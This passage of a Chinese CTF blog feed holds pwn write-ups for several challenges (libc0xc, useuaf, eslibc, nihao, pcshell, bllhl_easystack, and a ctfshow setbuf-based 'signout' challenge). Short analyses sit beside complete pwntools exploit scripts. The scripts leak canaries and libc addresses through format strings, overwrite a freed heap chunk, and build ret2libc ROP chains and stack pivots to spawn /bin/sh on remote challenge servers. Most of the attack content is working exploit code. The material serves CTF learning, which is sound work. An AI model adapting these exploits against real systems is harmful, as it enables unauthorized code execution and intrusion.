class="line">p3=p32(hh+1)+b&quot;%7$hhn&quot;</span><br><span class="line">sl(p3)</span><br><span class="line">p1=p32(canary)*0xc+p32(getshell)</span><br><span class="line">s(p1)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="libc0xc"><a href="#libc0xc" class="headerlink" title="libc0xc"></a>libc0xc</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>32位开启了canary保护，存在格式化字符串漏洞，没有明显的后门函数</p><h2 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h2><p>利用fmt泄漏canary的值与libc，再打ret2libc即可</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">#context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)#, log_level=&#x27;debug&#x27;, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])</span><br><span class="line"></span><br><span class="line">pwn_file=&#x27;./libc0xc&#x27;</span><br><span class="line">libc_file=&#x27;./libc.so&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">libc=ELF(libc_file)</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;1.95.36.136&#x27;</span><br><span class="line">    port=2065</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(str(delim), data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(str(delim), data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">p_addr  =   lambda addr                 : print(hex(addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">ul32    =   lambda data                 : u32(io.recv(data).ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ul64    =   lambda data                 : u64(io.recv(data).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">lbp     =   lambda addr                 : addr-libc.sym[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">ru(b&quot;Input something to win:\n&quot;)</span><br><span class="line">sl(b&quot;%31$p--%39$p&quot;)</span><br><span class="line">ru(b&quot;0x&quot;)</span><br><span class="line">canary=i32(8)</span><br><span class="line">ru(b&quot;--0x&quot;)</span><br><span class="line">__libc_start_main=i32(8)-247</span><br><span class="line">leak(&quot;__libc_start_main&quot;,__libc_start_main)</span><br><span class="line">leak(&quot;canary&quot;,canary)</span><br><span class="line">leak(&quot;__libc_start_main&quot;,libc.sym[&#x27;__libc_start_main&#x27;])</span><br><span class="line">libc_base=__libc_start_main-0x18550</span><br><span class="line">system=libc_base+0x03a950</span><br><span class="line">bin_sh=libc_base+0x15912b</span><br><span class="line">ret=0x080483ce</span><br><span class="line"></span><br><span class="line">p=p32(canary)*20+p32(system)+p32(0)+p32(bin_sh)</span><br><span class="line">sl(p)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="useuaf"><a href="#useuaf" class="headerlink" title="useuaf"></a>useuaf</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>一道32位的堆题目，存在后门函数与UAF漏洞</p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])</span><br><span class="line"></span><br><span class="line">pwn_file=&#x27;./useuaf&#x27;</span><br><span class="line">#libc_file=&#x27;./libc.so.6&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">#libc=ELF(libc_file)</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;1.95.36.136&#x27;</span><br><span class="line">    port=2057</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(delim, data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(delim, data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">ul32    =   lambda data                 : u32(io.recv(data).ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ul64    =   lambda data                 : u64(io.recv(data).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">lbp     =   lambda addr                 : addr-libc.sym[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell=0x804875C</span><br><span class="line">def add(size,data):</span><br><span class="line">sla(&quot;4. exit\n&quot;,&quot;1&quot;)</span><br><span class="line">sla(&quot;Size: &quot;,str(size))</span><br><span class="line">sla(&quot;Data: &quot;,data)</span><br><span class="line"></span><br><span class="line">def Del(id):</span><br><span class="line">sla(&quot;4. exit\n&quot;,&quot;2&quot;)</span><br><span class="line">sla(&quot;Index: &quot;,str(id))</span><br><span class="line"></span><br><span class="line">def use(id):</span><br><span class="line">sla(&quot;4. exit\n&quot;,&quot;3&quot;)</span><br><span class="line">sla(&quot;Index: &quot;,str(id))</span><br><span class="line"></span><br><span class="line">add(32,&quot;a&quot;*32)</span><br><span class="line">add(32,b&quot;b&quot;*32)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Del(0)</span><br><span class="line">Del(1)</span><br><span class="line"></span><br><span class="line">add(8,p32(shell))</span><br><span class="line">use(0)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="eslibc"><a href="#eslibc" class="headerlink" title="eslibc"></a>eslibc</h1><h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><p>开启了pie保护，但给了input地址，直接打ret2libc即可</p><h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)#, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])</span><br><span class="line"></span><br><span class="line">pwn_file=&#x27;./eslibc&#x27;</span><br><span class="line">#libc_file=&#x27;./libc.so.6&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">#libc=ELF(libc_file)</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;1.95.36.136&#x27;</span><br><span class="line">    port=2059</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(delim, data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(delim, data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">ul32    =   lambda data                 : u32(io.recv(data).ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ul64    =   lambda data                 : u64(io.recv(data).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">lbp     =   lambda addr                 : addr-libc.sym[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">ru(&quot;0x&quot;)</span><br><span class="line">base_addr=i64(12)-0x9f4</span><br><span class="line">leak(&quot;base_addr&quot;,base_addr)</span><br><span class="line">ret=base_addr+0x07b1</span><br><span class="line">rdi=base_addr+0x0ad3</span><br><span class="line">puts_plt=base_addr+elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=base_addr+elf.got[&#x27;puts&#x27;]</span><br><span class="line">main=base_addr+0xA27</span><br><span class="line"></span><br><span class="line">p1=cyclic(0x100+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">sl(p1)</span><br><span class="line">puts_addr=uul64()</span><br><span class="line">leak(&quot;puts_addr&quot;,puts_addr)</span><br><span class="line">libc_base=puts_addr-0x06f6a0</span><br><span class="line">system=libc_base+0x0453a0</span><br><span class="line">bin_sh=libc_base+0x18ce57</span><br><span class="line"></span><br><span class="line">p2=cyclic(0x100+8)+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)+p64(main)</span><br><span class="line">sl(p2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="nihao"><a href="#nihao" class="headerlink" title="nihao"></a>nihao</h1><h2 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h2><p>简单的ret2text</p><h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)#, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])</span><br><span class="line"></span><br><span class="line">pwn_file=&#x27;./nihao&#x27;</span><br><span class="line">#libc_file=&#x27;./libc.so.6&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">#libc=ELF(libc_file)</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;1.95.36.136&#x27;</span><br><span class="line">    port=2130</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(delim, data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(delim, data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">ul32    =   lambda data                 : u32(io.recv(data).ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ul64    =   lambda data                 : u64(io.recv(data).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">lbp     =   lambda addr                 : addr-libc.sym[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">ret=0x04005b9</span><br><span class="line">rdi=0x0400893</span><br><span class="line">bin_sh=0x04008c7</span><br><span class="line">system=0x04007C3</span><br><span class="line"></span><br><span class="line">p=cyclic(0x40+8)+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">sl(p)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="pcshell"><a href="#pcshell" class="headerlink" title="pcshell"></a>pcshell</h1><h2 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h2><p>开了canary与pie保护，但存在fmt并给出了polar的地址，那么就可以canary的值与基址，直接打即可</p><h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)#, terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])</span><br><span class="line"></span><br><span class="line">pwn_file=&#x27;./pcshell&#x27;</span><br><span class="line">#libc_file=&#x27;./libc.so.6&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">#libc=ELF(libc_file)</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;1.95.36.136&#x27;</span><br><span class="line">    port=2119</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(delim, data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(delim, data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">ul32    =   lambda data                 : u32(io.recv(data).ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ul64    =   lambda data                 : u64(io.recv(data).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">lbp     =   lambda addr                 : addr-libc.sym[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">sl(b&quot;%47$p&quot;)</span><br><span class="line">ru(&quot;0x&quot;)</span><br><span class="line">canary=i32(8)</span><br><span class="line">leak(&quot;canary&quot;,canary)</span><br><span class="line">ru(&quot;0x&quot;)</span><br><span class="line">base_addr=i32(8)-0x2080</span><br><span class="line">leak(&quot;base_addr&quot;,base_addr)</span><br><span class="line">backdoor=base_addr+0x8B0</span><br><span class="line"></span><br><span class="line">p=p32(canary)*45+p32(backdoor)</span><br><span class="line">sl(p)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="bllhl-easystack"><a href="#bllhl-easystack" class="headerlink" title="bllhl_easystack"></a>bllhl_easystack</h1><h2 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h2><p>打最基础的栈迁移</p><h2 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h2><p>不知道为什么远程连不上，由于本地环境与远程不一样，所以就只给出第一次栈迁移的exp，后面打ret2libc是一样的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s(b&quot;a&quot;*0x50)</span><br><span class="line">ru(b&quot;a&quot;*0x50)</span><br><span class="line">ebp=u32(io.recvuntil(&#x27;\xff&#x27;)[-4:])</span><br><span class="line">leak(&quot;ebp&quot;,ebp)</span><br><span class="line">addr=ebp-0x60</span><br><span class="line">leave_ret=0x0804856f</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">input_addr=0x08048571</span><br><span class="line"></span><br><span class="line">p1=p32(puts_plt)+p32(input_addr)+p32(puts_got)</span><br><span class="line">p1=p1.ljust(0x50,b&#x27;a&#x27;)+p32(addr-4)+p32(leave_ret)</span><br><span class="line">sl(p1)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow_pwn_萌新赛_签退</title>
      <link href="/2025/12/03/ctfshow-pwn-%E8%90%8C%E6%96%B0%E8%B5%9B-%E7%AD%BE%E9%80%80/"/>
      <url>/2025/12/03/ctfshow-pwn-%E8%90%8C%E6%96%B0%E8%B5%9B-%E7%AD%BE%E9%80%80/</url>
      
        <content type="html"><![CDATA[<p>看学弟在群里提到刷题过程中遇到了一道setbuf缓冲区，且是一道签退题，就想到了该题，于是就打算写一下。</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><img src="/images/ctfshow_pwn_%E8%90%8C%E6%96%B0%E8%B5%9B_%E7%AD%BE%E9%80%80_1.png"></p><p>一道32位题目，开启了NX保护与Partial RELRO，接着放入ida中进行分析。</p><p><img src="/images/ctfshow_pwn_%E8%90%8C%E6%96%B0%E8%B5%9B_%E7%AD%BE%E9%80%80_2.png"></p><p>先是设置缓冲区，将标准输入与标准输出都设置为无缓冲，然后进入vuln函数。</p><p><img src="/images/ctfshow_pwn_%E8%90%8C%E6%96%B0%E8%B5%9B_%E7%AD%BE%E9%80%80_3.png"></p><p>是一道菜单题目，有add、delete、post三个功能。通过大致的分析可以知道此题主要的关键变量为letters，其位于栈上1328字节长的一段内存。接着再分别仔细分析三个关键函数</p><h2 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h2><p><img src="/images/ctfshow_pwn_%E8%90%8C%E6%96%B0%E8%B5%9B_%E7%AD%BE%E9%80%80_4.png"></p><p>通过ida静态分析可以知道，最多能创建5个letter，每个letter占0x108个字节长的内存空间，前4个字节长的空间存放是否被使用的标识即0或1，紧挨着4个字节长的空间存放输入的contents的长度，再接着才是存放输入的contents的具体内容。我们可以用gdb进行调试一下：</p><p><img src="/images/ctfshow_pwn_%E8%90%8C%E6%96%B0%E8%B5%9B_%E7%AD%BE%E9%80%80_5.png"></p><p>可以看到，在输入contents后，栈上的数据和上述分析的一样。</p><h2 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h2><p><img src="/images/ctfshow_pwn_%E8%90%8C%E6%96%B0%E8%B5%9B_%E7%AD%BE%E9%80%80_6.png"></p><p>用户需要输入正确的ID，接着分别将选择的letter的标识、长度以及contents清空，其实就是一个简单的删除功能，看起来没什么问题。</p><h2 id="post函数"><a href="#post函数" class="headerlink" title="post函数"></a>post函数</h2><p><img src="/images/ctfshow_pwn_%E8%90%8C%E6%96%B0%E8%B5%9B_%E7%AD%BE%E9%80%80_7.png"></p><p>这个函数传入了两个参数，一个是存放letter的内存空间，一个是文件fd，而这个就是&#x2F;dev&#x2F;null。在该函数的功能方面依旧是需要选择正确的id，再选择filter，通过选择不同的filter对letter进行操作，这里需要传入三个参数：fd、letter的contents以及contents的长度。</p><h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p>通过上述分析，本题限制了输入字节长度，正常情况下是无法造成溢出的。在post函数中存在一个数组越界漏洞，即我们输入的n2可以为负数，那么我们输入负数就可以访问到got表上的内容，并将其作为一个函数调用</p><p><img src="/images/ctfshow_pwn_%E8%90%8C%E6%96%B0%E8%B5%9B_%E7%AD%BE%E9%80%80_8.png"></p><p>但是有一个问题在于，函数的调用需要传入FILE *、char *与int这三个参数，同时该函数还能用来进行攻击。因此本题最精彩的一点就是得用setbuf函数来进行攻击，使用setbuf函数将buf与fd绑定，再多次向fd中写入数据从而就可以造成溢出了。通过分析，第五个letter造成溢出至少要0x108+4个字节，而每一个letter可以输入0x100个字节，因此我们只需要构造第一个和第二个letter，再post到第五个letter从而造成溢出即可。</p><p>ok，那么我们先add所需letter，至于为什么构造payload2的时候是0xD而不是0xC，是因为在动调的过程中发现实际上payload1的长度为0xFF个字节，并不是0x100个字节，所以在构造payload2的时候需要多输入一个字节。</p><p><img src="/images/ctfshow_pwn_%E8%90%8C%E6%96%B0%E8%B5%9B_%E7%AD%BE%E9%80%80_10.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1=b&quot;a&quot;*0x100</span><br><span class="line">payload2=b&quot;a&quot;*0xD+p32(puts_plt)+p32(vuln)+p32(puts_got)</span><br><span class="line">payload3=b&quot;aaaa&quot;</span><br><span class="line">payload4=b&quot;aaaa&quot;</span><br><span class="line">payload5=b&quot;aaaa&quot;</span><br><span class="line"></span><br><span class="line">add(payload1)</span><br><span class="line">add(payload2)</span><br><span class="line">add(payload3)</span><br><span class="line">add(payload4)</span><br><span class="line">add(payload5)</span><br></pre></td></tr></table></figure><p>接着再setbuf将fd与letter5绑定</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setbuf_index=int((setbuf_addr-func_addr)/4)</span><br><span class="line">post(4,setbuf_index)</span><br><span class="line">post(0,0)</span><br><span class="line">post(1,0)</span><br><span class="line">quit()</span><br></pre></td></tr></table></figure><p><img src="/images/ctfshow_pwn_%E8%90%8C%E6%96%B0%E8%B5%9B_%E7%AD%BE%E9%80%80_9.png"></p><p>选择0时，就是将构造的letter里面的数据写入到文件中，由于我们将文件与letter5绑定到了一起，因此就相当于往letter5里面写入数据从而造成溢出。后面就是借鉴前面思路的打ret2libc了。</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;,terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;])</span><br><span class="line">pwn_file=&#x27;./signout&#x27;</span><br><span class="line">libc_file=&#x27;./libc.so&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">libc=ELF(libc_file)</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;pwn.challenge.ctf.show&#x27;</span><br><span class="line">    port=28233</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(str(delim), data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(str(delim), data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line">def add(contents):</span><br><span class="line">    sl(b&quot;1&quot;)</span><br><span class="line">    sl(contents)</span><br><span class="line"></span><br><span class="line">def delete(id):</span><br><span class="line">    sl(b&quot;2&quot;)</span><br><span class="line">    sl(str(id))</span><br><span class="line"></span><br><span class="line">def post(id,choose):</span><br><span class="line">    sl(b&quot;3&quot;)</span><br><span class="line">    sl(str(id))</span><br><span class="line">    sl(str(choose))</span><br><span class="line"></span><br><span class="line">def quit():</span><br><span class="line">    sl(b&quot;4&quot;)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">vuln=0x08048BD0</span><br><span class="line"></span><br><span class="line">payload1=b&quot;a&quot;*0x100</span><br><span class="line">payload2=b&quot;a&quot;*0xD+p32(puts_plt)+p32(vuln)+p32(puts_got)</span><br><span class="line">payload3=b&quot;aaaa&quot;</span><br><span class="line">payload4=b&quot;aaaa&quot;</span><br><span class="line">payload5=b&quot;aaaa&quot;</span><br><span class="line"></span><br><span class="line">add(payload1)</span><br><span class="line">add(payload2)</span><br><span class="line">add(payload3)</span><br><span class="line">add(payload4)</span><br><span class="line">add(payload5)</span><br><span class="line"></span><br><span class="line">setbuf_addr=0x0804B00C</span><br><span class="line">func_addr=0x0804B048</span><br><span class="line"></span><br><span class="line">#debug()</span><br><span class="line">setbuf_index=int((setbuf_addr-func_addr)/4)</span><br><span class="line">post(4,setbuf_index)</span><br><span class="line">post(0,0)</span><br><span class="line">post(1,0)</span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line">puts=uul32()</span><br><span class="line">print(hex(puts))</span><br><span class="line">libc_base=puts-libc.sym[&#x27;puts&#x27;]</span><br><span class="line">system=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh=libc_base+next(libc.search(&#x27;/bin/sh\x00&#x27;))</span><br><span class="line"></span><br><span class="line">payload6=b&quot;a&quot;*0xD+p32(system)+p32(vuln)+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">add(payload1)</span><br><span class="line">add(payload6)</span><br><span class="line">add(payload3)</span><br><span class="line">add(payload4)</span><br><span class="line">add(payload5)</span><br><span class="line"></span><br><span class="line">setbuf_index=int((setbuf_addr-func_addr)/4)</span><br><span class="line">post(4,setbuf_index)</span><br><span class="line">post(0,0)</span><br><span class="line">post(1,0)</span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" 